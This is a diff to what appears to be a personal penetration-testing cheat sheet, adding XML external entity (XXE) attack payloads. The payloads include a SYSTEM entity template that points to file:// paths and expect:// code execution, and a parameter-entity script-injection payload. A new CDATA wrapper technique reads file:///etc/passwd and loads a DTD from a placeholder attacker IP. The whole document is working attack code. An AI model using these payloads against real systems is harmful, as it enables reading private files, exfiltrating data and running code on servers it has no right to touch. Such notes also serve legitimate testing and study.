@@ -2695,13 +2695,14 @@
 ***** XXE
       #+begin_src xml
         <!-- Private (SYSTEM) -->
-        <!-- "url" can be
+        <!-- "uri" can be
              - a standard URL
              - file:///<full-path> - Dir trav
+               - Some implementations read dirs
              - PHP wrapper (expect://<rce>)
              - Java/other implementation  -->
         <?xml version="1.0" encoding="ISO-8859-1"?>
-        <!DOCTYPE test [<!ENTITY xxe SYSTEM "<url>">]>
+        <!DOCTYPE test [<!ENTITY xxe SYSTEM "<uri>">]>
         <test>&xxe;</test>
 
         <!-- Alternative with ELEMENT -->
@@ -2723,6 +2724,27 @@
         <!-- Parameter Entities -->
         <!DOCTYPE p [<!ENTITY % param SYSTEM "alert()"> <!ENTITY xss "<script>%param</script>">]>
         <title>&xss;</title>
+
+        <!-- Using an external DTD as wrapper -->
+        <!-- to bypass entity concat error -->
+        <!-- wrapper.dtd in our local machine -->
+        <!ENTITY wrapper "%start;%file;%end;">
+
+        <!-- XML to send to the parser -->
+        <?xml version="1.0" encoding="ISO-8859-1"?>
+        <!DOCTYPE data [
+          <!ENTITY % start "<![CDATA[">
+          <!ENTITY % file SYSTEM "file:///etc/passwd" >
+          <!ENTITY % end "]]>">
+          <!ENTITY % dtd SYSTEM "http://<attacker-ip>/wrapper.dtd" >
+          %dtd;
+        ]>
+        <test>&wrapper;</test>
+
+        <!-- Unparsed External Entities -->
+        <!-- Allows accessing binary data -->
+        <!ENTITY name SYSTEM "<uri>" NDATA TYPE>
+        <!ENTITY name PUBLIC "<pub-id>" "<uri>" NDATA TYPE>
 
         <!-- Exfiltrate data - External DTD -->
         <!-- 1 - external.dtd file -->
